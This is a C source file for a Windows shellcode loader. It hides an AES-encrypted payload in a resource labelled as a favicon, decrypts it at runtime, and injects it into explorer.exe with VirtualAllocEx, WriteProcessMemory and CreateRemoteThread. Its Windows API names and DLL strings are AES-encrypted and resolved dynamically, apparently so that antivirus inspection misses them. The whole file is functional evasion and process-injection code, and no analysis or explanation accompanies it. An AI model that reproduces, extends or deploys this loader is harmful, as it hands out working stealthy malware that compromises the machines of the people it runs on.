#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include "resources.h"
#include "helpers.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <Lmcons.h>

#pragma comment(linker, "/entry:WinMain")

typedef HMODULE (WINAPI * GetModuleHandleA_t)(
  LPCSTR lpModuleName
);

typedef FARPROC (WINAPI * GetProcAddress_t)(
  HMODULE hModule,
  LPCSTR  lpProcName
);

typedef LPVOID (WINAPI * VirtualAllocEx_t)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef BOOL (WINAPI * WriteProcessMemory_t)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

typedef HANDLE (WINAPI * CreateRemoteThread_t)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

typedef LPVOID (WINAPI * VirtualAlloc_t)(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(
  DWORD dwFlags,
  DWORD th32ProcessID
);

typedef BOOL (WINAPI * Process32First_t)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

typedef BOOL (WINAPI * Process32Next_t)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

typedef HRSRC (WINAPI * FindResourceA_t)(
  HMODULE hModule,
  LPCSTR  lpName,
  LPCSTR  lpType
);

typedef HGLOBAL (WINAPI * LoadResource_t)(
  HMODULE hModule,
  HRSRC   hResInfo
);

typedef LPVOID (WINAPI * LockResource_t)(
  HGLOBAL hResData
);

typedef DWORD (WINAPI * SizeofResource_t)(
  HMODULE hModule,
  HRSRC   hResInfo
);

typedef VOID (WINAPI * RtlMoveMemory_t)(
  VOID UNALIGNED *Destination,
  VOID UNALIGNED *Source,
  SIZE_T Length
);

typedef BOOL (WINAPI * CloseHandle_t)(
  HANDLE hObject
);

typedef DWORD (WINAPI * WaitForSingleObject_t)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

typedef HANDLE (WINAPI * OpenProcess_t)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

typedef int (WINAPI * lstrcmpiA_t)(
  LPCSTR lpString1,
  LPCSTR lpString2
);

typedef BOOL (WINAPI * CryptAcquireContextW_t)(
  HCRYPTPROV *phProv,
  LPCWSTR    szContainer,
  LPCWSTR    szProvider,
  DWORD      dwProvType,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptCreateHash_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTKEY  hKey,
  DWORD      dwFlags,
  HCRYPTHASH *phHash
);

typedef BOOL (WINAPI * CryptHashData_t)(
  HCRYPTHASH hHash,
  const BYTE *pbData,
  DWORD      dwDataLen,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDeriveKey_t)(
  HCRYPTPROV hProv,
  ALG_ID     Algid,
  HCRYPTHASH hBaseData,
  DWORD      dwFlags,
  HCRYPTKEY  *phKey
);

typedef BOOL (WINAPI * CryptDecrypt_t)(
  HCRYPTKEY  hKey,
  HCRYPTHASH hHash,
  BOOL       Final,
  DWORD      dwFlags,
  BYTE       *pbData,
  DWORD      *pdwDataLen
);

typedef BOOL (WINAPI * CryptReleaseContext_t)(
  HCRYPTPROV hProv,
  DWORD      dwFlags
);

typedef BOOL (WINAPI * CryptDestroyHash_t)(
  HCRYPTHASH hHash
);

typedef BOOL (WINAPI * CryptDestroyKey_t)(
  HCRYPTKEY hKey
);

char pkey[] = { 0x80, 0x5f, 0xd5, 0xc6, 0x9b, 0x31, 0x90, 0x16, 0x89, 0x68, 0x29, 0xb8, 0x86, 0x94, 0xf6, 0x2f };
char k[] = { 0xe3, 0xf0, 0x4, 0x7c, 0x71, 0xfe, 0xd4, 0x1d, 0x81, 0x89, 0x26, 0x19, 0x3b, 0xaf, 0x3a, 0x6d };

//// AES ENCR FUNCTIONS
unsigned char sVirtualAllocEx[] = { 0x56, 0x51, 0x3c, 0x2e, 0x6a, 0x5a, 0xc8, 0xde, 0xcc, 0x4e, 0xfd, 0xb, 0x0, 0x3f, 0x4f, 0x29 };
unsigned char sWriteProcessMemory[] = { 0xdc, 0x58, 0x4e, 0xa, 0x39, 0x46, 0x4a, 0x28, 0xf1, 0x4, 0xcb, 0x56, 0x5a, 0x42, 0x26, 0x31, 0xb6, 0xe7, 0x4f, 0x33, 0x2, 0x8f, 0x2e, 0x1f, 0xb0, 0xc6, 0xda, 0x78, 0xa3, 0x87, 0xc6, 0xe2 };
unsigned char sCreateRemoteThread[] = { 0x19, 0xd9, 0x83, 0xdb, 0xb8, 0xda, 0xd1, 0x24, 0xf7, 0x2a, 0x2e, 0xd8, 0xfe, 0x29, 0x6, 0xd6, 0xc0, 0x9f, 0xba, 0x60, 0x44, 0xae, 0x94, 0xd4, 0xd7, 0x58, 0x6a, 0x13, 0x4, 0x10, 0xab, 0x82 };
unsigned char sOpenProcess[] = { 0x2a, 0x9e, 0x14, 0x97, 0x1c, 0xf9, 0xaf, 0x1a, 0xa2, 0x21, 0xf4, 0x96, 0xf5, 0x78, 0x41, 0xa5 };
unsigned char sFindResourceA[] = { 0xc0, 0x3e, 0xf7, 0xd4, 0x0, 0x99, 0x75, 0xe0, 0xde, 0xa2, 0xfc, 0xae, 0xdc, 0x37, 0x1f, 0xe6 };
unsigned char sLoadResource[] = { 0xbd, 0x12, 0x6f, 0x38, 0x74, 0x97, 0x4b, 0xef, 0x24, 0xf1, 0xef, 0x54, 0x43, 0xad, 0x2a, 0xb4 };
unsigned char sLockResource[] = { 0x1d, 0xda, 0xdc, 0x54, 0x55, 0x1f, 0x2a, 0xad, 0x6c, 0xe6, 0x78, 0xb6, 0x65, 0x8f, 0x22, 0xd3 };
unsigned char sSizeofResource[] = { 0xc9, 0xed, 0xbf, 0xe1, 0x2d, 0xd6, 0x1e, 0xa9, 0xe0, 0x95, 0x5b, 0x16, 0xa4, 0x7b, 0x14, 0x46 };
unsigned char sVirtualAlloc[] = { 0xac, 0x1c, 0x20, 0xa9, 0x39, 0x60, 0x4f, 0x10, 0xeb, 0x79, 0x13, 0x95, 0xba, 0x57, 0xb6, 0x6f };
unsigned char sRtlMoveMemory[] = { 0x7d, 0x80, 0x9a, 0xae, 0xb2, 0x19, 0x74, 0x86, 0x38, 0x9d, 0xa8, 0xad, 0x81, 0xe4, 0xa6, 0xb6 };
unsigned char sWaitForSingleObject[] = { 0x8c, 0x61, 0x73, 0x4e, 0x56, 0xf9, 0xbc, 0xa0, 0xa0, 0x89, 0x18, 0x21, 0x8c, 0x98, 0xe2, 0x66, 0x59, 0x20, 0x8, 0xd1, 0x89, 0xcf, 0x2d, 0xda, 0x8a, 0x29, 0x14, 0x8c, 0x30, 0x22, 0xea, 0x33 };
unsigned char sCloseHandle[] = { 0x2f, 0xd7, 0x56, 0xfe, 0x9d, 0xda, 0xb2, 0x80, 0x28, 0xc8, 0x91, 0x52, 0xab, 0x25, 0x74, 0x8d };
unsigned char sCreateToolhelp32Snapshot[] = { 0x5c, 0x36, 0x1, 0xa0, 0xfe, 0x5c, 0x4e, 0x64, 0x2f, 0x3e, 0xd4, 0x1d, 0x2d, 0xa3, 0x14, 0x93, 0x3e, 0x88, 0x68, 0x87, 0x56, 0xc0, 0xb1, 0x90, 0x9f, 0x98, 0xa1, 0x1a, 0xf4, 0xea, 0xcf, 0xee };
unsigned char sProcess32First[] = { 0xad, 0x44, 0x9e, 0xcf, 0xfa, 0xba, 0x63, 0xcf, 0x64, 0xb1, 0xdd, 0x8a, 0x77, 0x5c, 0x68, 0xfa };
unsigned char sProcess32Next[] = { 0x2, 0xbd, 0x61, 0xdc, 0x75, 0x85, 0x3d, 0x51, 0x29, 0x55, 0x91, 0x4, 0x6a, 0xcf, 0x91, 0xf0 };
unsigned char slstrcmpiA[] = { 0xca, 0x75, 0x1c, 0x48, 0x85, 0x6, 0x20, 0xf4, 0xaf, 0x79, 0x17, 0x1e, 0x84, 0x9e, 0x7c, 0xae };

//// AES ENCR STRINGS
unsigned char sKdll[] = { 0x2a, 0x55, 0x4c, 0x95, 0x38, 0x9a, 0x20, 0xa4, 0x66, 0xe8, 0xbe, 0x8, 0x8, 0x33, 0x29, 0xca }; //kernel32.dll
unsigned char sNdll[] = { 0x5a, 0x21, 0xa9, 0x73, 0xce, 0x83, 0x1d, 0xdd, 0xa9, 0xa0, 0x8d, 0x3a, 0x6f, 0x9d, 0x15, 0x3b }; //Ntdll.dll
unsigned char sPrNa[] = { 0x59, 0xd6, 0x94, 0x1c, 0x64, 0x7d, 0x84, 0xb0, 0x23, 0x31, 0x4d, 0x9c, 0x13, 0x45, 0xb6, 0xbd }; //Explorer.exe

int AESDecrypt(char * payl, unsigned int payl_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
		
		// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
		GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
		GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
		
		CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptAcquireContextW");
		CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptCreateHash");
		CryptHashData_t pCryptHashData = (CryptHashData_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptHashData");
		CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDeriveKey");
		CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDecrypt");
		CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptReleaseContext"); 
		CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDestroyHash");
		CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) pGetProcAddress(pGetModuleHandleA("Advapi32.dll"), "CryptDestroyKey");

        if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!pCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
		if (!pCryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payl, (DWORD *) &payl_len)){
			return -1;
		}
        
        pCryptReleaseContext(hProv, 0);
        pCryptDestroyHash(hHash);
        pCryptDestroyKey(hKey);
        
        return 0;
}

int GePr(const char *pname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
		
		// AES decrypt windows API strings
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), k, sizeof(k)); 
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), k, sizeof(k));
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), k, sizeof(k));
		AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));
		AESDecrypt((char *) slstrcmpiA, sizeof(slstrcmpiA), k, sizeof(k));
		
		// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
		GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
		GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
		
		// Get the other handles using pGetModuleHandleA and pGetProcAddress
		CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCreateToolhelp32Snapshot);
		Process32First_t pProcess32First = (Process32First_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sProcess32First);
		Process32Next_t pProcess32Next = (Process32Next_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sProcess32Next);
		CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
		lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) slstrcmpiA);
                
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (plstrcmpiA(pname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int Inj(HANDLE hProc, unsigned char * payl, unsigned int payl_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
		// AES decrypt windows API strings
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), k, sizeof(k));
		AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), k, sizeof(k));
		AESDecrypt((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), k, sizeof(k));
		AESDecrypt((char *) sWaitForSingleObject, sizeof(sWaitForSingleObject), k, sizeof(k));
		AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), k, sizeof(k));

		// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
		GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
		GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
		
		// Get the other handles using pGetModuleHandleA and pGetProcAddress
		VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sVirtualAllocEx);
		WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sWriteProcessMemory);
		CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCreateRemoteThread);
		WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sWaitForSingleObject);
		CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
  
        pRemoteCode = pVirtualAllocEx(hProc, NULL, payl_len, MEM_COMMIT, PAGE_EXECUTE_READ);
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payl, (SIZE_T)payl_len, (SIZE_T *)NULL);
        
        hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}

//int main(void) {
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {

	// Get handles and pointer to normal GetModuleHandle with our hlpGetProcAddress from helpers.h
	GetModuleHandleA_t pGetModuleHandleA = (GetModuleHandleA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleA");
	GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
	
	void * emem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	char * payl;
	unsigned int payl_len;
	
	int pid = 0;
    HANDLE hProc = NULL;
	
	// AES decrypt windows API strings
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), k, sizeof(k));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), k, sizeof(k));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), k, sizeof(k));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), k, sizeof(k));
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), k, sizeof(k));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), k, sizeof(k));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), k, sizeof(k));
	
	// AES decrypt dll strings
	AESDecrypt((char *) sKdll, sizeof(sKdll), k, sizeof(k));
	AESDecrypt((char *) sNdll, sizeof(sNdll), k, sizeof(k));
	AESDecrypt((char *) sPrNa, sizeof(sPrNa), k, sizeof(k));
	
	FindResourceA_t pFindResourceA = (FindResourceA_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sFindResourceA);
	LoadResource_t pLoadResource = (LoadResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sLoadResource);
	LockResource_t pLockResource = (LockResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sLockResource);
	SizeofResource_t pSizeofResource = (SizeofResource_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sSizeofResource);
	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sVirtualAlloc);
	OpenProcess_t pOpenProcess = (OpenProcess_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sOpenProcess);
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandleA((char *) sNdll), (char *) sRtlMoveMemory);
	CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandleA((char *) sKdll), (char *) sCloseHandle);
	
	// Extract payl from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	payl = (char *) pLockResource(resHandle);
	payl_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for payl
	emem = pVirtualAlloc(0, payl_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payl to new memory buffer
	pRtlMoveMemory(emem, payl, payl_len);
	
	// Decrypt the payl
	AESDecrypt((char *) emem, payl_len, pkey, sizeof(pkey));
	
	// Injopn process starts here...
	pid = GePr((char *) sPrNa);
	
	if (pid) {	
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inj(hProc, (unsigned char *) emem, payl_len);
			pCloseHandle(hProc);
		}
	}
	
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

	return 0;
}
